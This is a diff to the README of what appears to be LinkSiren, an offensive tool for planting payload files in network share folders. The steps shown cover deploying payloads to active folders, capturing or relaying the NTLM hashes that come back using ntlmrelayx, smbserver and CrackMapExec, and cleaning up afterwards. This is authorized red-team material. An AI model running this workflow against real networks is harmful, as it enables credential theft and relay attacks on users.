@@ -33,7 +33,9 @@ python link_siren.py --username <username> --password <password> --domain <domai
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
-# 4. Let the hashes come to you and relay them as you see fit :) (I recommend CrackMapExec and LdapRelayScan for target identification)
+# 4. Let the hashes come to you and relay them as you see fit :)
+#    Use CrackMapExec and LdapRelayScan for relay target identification
+#    Use Impacket's ntlmrelayx for relay or smbserver for capture on the attacker machine
 # 5. Cleanup the payload files when you're finished gathering.
 #    Set targets to a file containing UNC paths of all folders where payloads were written
 #    --deploy saves UNC paths to deployed payloads in payload_folders.txt
